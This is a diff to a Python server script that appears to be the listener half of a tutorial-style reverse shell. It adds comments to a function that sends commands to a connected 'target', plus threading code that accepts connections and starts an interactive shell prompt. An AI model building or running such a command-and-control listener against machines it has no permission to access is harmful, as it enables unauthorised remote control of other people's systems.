@@ -119,10 +119,42 @@ def send_target_commands(conn):
             cmd = input()
             if cmd == 'quit':
                 break
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
+            if len(str.encode(cmd)) > 0: #if the command is not empty
+                conn.send(str.encode(cmd)) #send the command
+                client_response = str(conn.recv(20480), "utf-8") #receive the response and decode it
                 print(client_response, end="")
         except:
             print("Error sending commands")
             break
+
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work) #stores the thread in t
+        t.daemon = True #make sure the thread dies when the main thread dies
+        t.start()
+
+# Do the next job that is in the queue (handle connections, send commands)
+def work():
+    while True:
+        x = queue.get() #get the job from the queue
+        if x == 1: #if the job number is 1
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+
+        queue.task_done()
+
+# Each list item is a new job
+def create_jobs():
+    for x in JOB_NUMBER: #for each job number
+        queue.put(x) #put the job number in the queue
+
+    queue.join()
+
+create_workers()
+create_jobs()
+
+# Path: Client.py
